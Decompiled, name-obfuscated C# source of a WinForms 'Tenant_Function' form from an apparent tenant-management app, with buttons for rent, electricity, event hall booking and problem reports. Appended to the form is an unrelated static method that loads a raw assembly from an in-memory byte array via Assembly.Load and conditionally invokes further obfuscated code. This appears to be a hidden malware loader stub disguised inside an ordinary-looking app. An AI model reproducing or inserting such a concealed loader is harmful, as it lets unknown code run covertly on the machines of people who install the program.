using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Ng0w;
using d6D;
using g5QX;
using k2H;

namespace Wc7y;

[DesignerGenerated]
public class Yc81 : Form
{
	private IContainer components;

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label2")]
	internal virtual Label Label2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("MaskedTextBox1")]
	internal virtual MaskedTextBox MaskedTextBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button PayElectricity
	{
		[CompilerGenerated]
		get
		{
			return _PayElectricity;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = s1B0;
			Button payElectricity = _PayElectricity;
			if (payElectricity != null)
			{
				((Control)payElectricity).remove_Click(eventHandler);
			}
			_PayElectricity = value;
			payElectricity = _PayElectricity;
			if (payElectricity != null)
			{
				((Control)payElectricity).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button BookEventHall
	{
		[CompilerGenerated]
		get
		{
			return _BookEventHall;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = g6ZK;
			Button bookEventHall = _BookEventHall;
			if (bookEventHall != null)
			{
				((Control)bookEventHall).remove_Click(eventHandler);
			}
			_BookEventHall = value;
			bookEventHall = _BookEventHall;
			if (bookEventHall != null)
			{
				((Control)bookEventHall).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button FlatRent
	{
		[CompilerGenerated]
		get
		{
			return _FlatRent;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = x6CG;
			Button flatRent = _FlatRent;
			if (flatRent != null)
			{
				((Control)flatRent).remove_Click(eventHandler);
			}
			_FlatRent = value;
			flatRent = _FlatRent;
			if (flatRent != null)
			{
				((Control)flatRent).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button ProblemReport
	{
		[CompilerGenerated]
		get
		{
			return _ProblemReport;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Wx1w;
			Button problemReport = _ProblemReport;
			if (problemReport != null)
			{
				((Control)problemReport).remove_Click(eventHandler);
			}
			_ProblemReport = value;
			problemReport = _ProblemReport;
			if (problemReport != null)
			{
				((Control)problemReport).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button Back
	{
		[CompilerGenerated]
		get
		{
			return _Back;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Mj8f;
			Button back = _Back;
			if (back != null)
			{
				((Control)back).remove_Click(eventHandler);
			}
			_Back = value;
			back = _Back;
			if (back != null)
			{
				((Control)back).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button Logout
	{
		[CompilerGenerated]
		get
		{
			return _Logout;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Ys7j;
			Button logout = _Logout;
			if (logout != null)
			{
				((Control)logout).remove_Click(eventHandler);
			}
			_Logout = value;
			logout = _Logout;
			if (logout != null)
			{
				((Control)logout).add_Click(eventHandler);
			}
		}
	}

	public Yc81()
	{
		((Form)this).add_Load((EventHandler)i8H1);
		Ww3o();
	}

	[DebuggerNonUserCode]
	protected override void Ez71(bool Mx17)
	{
		try
		{
			if (Mx17 && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(Mx17);
		}
	}

	[DebuggerStepThrough]
	private void Ww3o()
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Expected O, but got Unknown
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Expected O, but got Unknown
		//IL_0026: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_004a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0054: Expected O, but got Unknown
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_0060: Expected O, but got Unknown
		//IL_0062: Unknown result type (might be due to invalid IL or missing references)
		//IL_006c: Expected O, but got Unknown
		//IL_0094: Unknown result type (might be due to invalid IL or missing references)
		//IL_009e: Expected O, but got Unknown
		//IL_011e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0128: Expected O, but got Unknown
		//IL_019b: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a5: Expected O, but got Unknown
		//IL_0207: Unknown result type (might be due to invalid IL or missing references)
		//IL_0211: Expected O, but got Unknown
		//IL_028e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0298: Expected O, but got Unknown
		//IL_0315: Unknown result type (might be due to invalid IL or missing references)
		//IL_031f: Expected O, but got Unknown
		//IL_039c: Unknown result type (might be due to invalid IL or missing references)
		//IL_03a6: Expected O, but got Unknown
		//IL_0423: Unknown result type (might be due to invalid IL or missing references)
		//IL_042d: Expected O, but got Unknown
		//IL_04ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_04b7: Expected O, but got Unknown
		Label1 = new Label();
		Label2 = new Label();
		MaskedTextBox1 = new MaskedTextBox();
		PayElectricity = new Button();
		BookEventHall = new Button();
		FlatRent = new Button();
		ProblemReport = new Button();
		Back = new Button();
		Logout = new Button();
		((Control)this).SuspendLayout();
		Label1.set_AutoSize(true);
		((Control)Label1).set_Font(new Font("Microsoft Sans Serif", 13.8f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label1).set_Location(new Point(507, 95));
		((Control)Label1).set_Name("Label1");
		((Control)Label1).set_Size(new Size(192, 29));
		((Control)Label1).set_TabIndex(0);
		Label1.set_Text("View Notification");
		Label2.set_AutoSize(true);
		((Control)Label2).set_Font(new Font("Microsoft Sans Serif", 10.2f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label2).set_Location(new Point(472, 164));
		((Control)Label2).set_Name("Label2");
		((Control)Label2).set_Size(new Size(82, 20));
		((Control)Label2).set_TabIndex(1);
		Label2.set_Text("Tenant ID");
		((Control)MaskedTextBox1).set_Font(new Font("Microsoft Sans Serif", 10.2f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)MaskedTextBox1).set_Location(new Point(610, 161));
		((Control)MaskedTextBox1).set_Name("MaskedTextBox1");
		((Control)MaskedTextBox1).set_Size(new Size(132, 27));
		((Control)MaskedTextBox1).set_TabIndex(2);
		((Control)PayElectricity).set_Font(new Font("Microsoft Sans Serif", 8.25f));
		((Control)PayElectricity).set_Location(new Point(89, 284));
		((Control)PayElectricity).set_Name("PayElectricity");
		((Control)PayElectricity).set_Size(new Size(181, 55));
		((Control)PayElectricity).set_TabIndex(1);
		((ButtonBase)PayElectricity).set_Text("Pay Electricity");
		((ButtonBase)PayElectricity).set_UseVisualStyleBackColor(true);
		((Control)BookEventHall).set_Font(new Font("Microsoft Sans Serif", 8.25f));
		((Control)BookEventHall).set_Location(new Point(89, 408));
		((Control)BookEventHall).set_Name("BookEventHall");
		((Control)BookEventHall).set_Size(new Size(181, 55));
		((Control)BookEventHall).set_TabIndex(2);
		((ButtonBase)BookEventHall).set_Text("Book Event Hall");
		((ButtonBase)BookEventHall).set_UseVisualStyleBackColor(true);
		((Control)FlatRent).set_Font(new Font("Microsoft Sans Serif", 8.25f));
		((Control)FlatRent).set_Location(new Point(89, 147));
		((Control)FlatRent).set_Name("FlatRent");
		((Control)FlatRent).set_Size(new Size(181, 55));
		((Control)FlatRent).set_TabIndex(0);
		((ButtonBase)FlatRent).set_Text("Flat Rent");
		((ButtonBase)FlatRent).set_UseVisualStyleBackColor(true);
		((Control)ProblemReport).set_Font(new Font("Microsoft Sans Serif", 8.25f));
		((Control)ProblemReport).set_Location(new Point(89, 530));
		((Control)ProblemReport).set_Name("ProblemReport");
		((Control)ProblemReport).set_Size(new Size(181, 55));
		((Control)ProblemReport).set_TabIndex(3);
		((ButtonBase)ProblemReport).set_Text("Problem Report");
		((ButtonBase)ProblemReport).set_UseVisualStyleBackColor(true);
		((Control)Back).set_Font(new Font("Microsoft Sans Serif", 8.25f));
		((Control)Back).set_Location(new Point(462, 381));
		((Control)Back).set_Name("Back");
		((Control)Back).set_Size(new Size(151, 51));
		((Control)Back).set_TabIndex(4);
		((ButtonBase)Back).set_Text("Back");
		((ButtonBase)Back).set_UseVisualStyleBackColor(true);
		((Control)Logout).set_Font(new Font("Microsoft Sans Serif", 8.25f));
		((Control)Logout).set_Location(new Point(662, 381));
		((Control)Logout).set_Name("Logout");
		((Control)Logout).set_Size(new Size(151, 51));
		((Control)Logout).set_TabIndex(5);
		((ButtonBase)Logout).set_Text("Logout");
		((ButtonBase)Logout).set_UseVisualStyleBackColor(true);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(8f, 16f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(910, 758));
		((Control)this).get_Controls().Add((Control)(object)Logout);
		((Control)this).get_Controls().Add((Control)(object)Back);
		((Control)this).get_Controls().Add((Control)(object)ProblemReport);
		((Control)this).get_Controls().Add((Control)(object)FlatRent);
		((Control)this).get_Controls().Add((Control)(object)BookEventHall);
		((Control)this).get_Controls().Add((Control)(object)PayElectricity);
		((Control)this).get_Controls().Add((Control)(object)MaskedTextBox1);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).set_Name("Tenant_Function");
		((Form)this).set_Text("Tenant_Function");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void g6ZK(object d6ZP, EventArgs a5K6)
	{
		((Control)b8G.Forms.Event_Hall).Show();
	}

	private void i8H1(object Bg6b, EventArgs b0EP)
	{
	}

	private void x6CG(object z1HJ, EventArgs Qp69)
	{
		((Control)b8G.Forms.Flat_Rent).Show();
	}

	private void s1B0(object i3Z9, EventArgs g4P1)
	{
		((Control)b8G.Forms.Pay_eletricity).Show();
	}

	private void Wx1w(object Yb95, EventArgs Ei8o)
	{
		((Control)b8G.Forms.Problem_Report).Show();
	}

	private void Mj8f(object De0d, EventArgs y5TF)
	{
		((Form)this).Close();
		((Control)b8G.Forms.Tenant_Login).Show();
	}

	private void Ys7j(object Ge61, EventArgs s3J0)
	{
		((Form)this).Close();
		((Control)b8G.Forms.Tenant_Login).Show();
	}

	internal static void Ga50()
	{
		Assembly assembly = null;
		if ((object)assembly == null)
		{
			byte[] rawAssembly = (byte[])Yw2.mDic[Yw2.mArray];
			assembly = Assembly.Load(rawAssembly);
		}
		Yw2.mDic.Add("Deep", assembly);
		assembly = null;
		if (Rw21.s0Z())
		{
			Es83.e2T6();
		}
	}
}
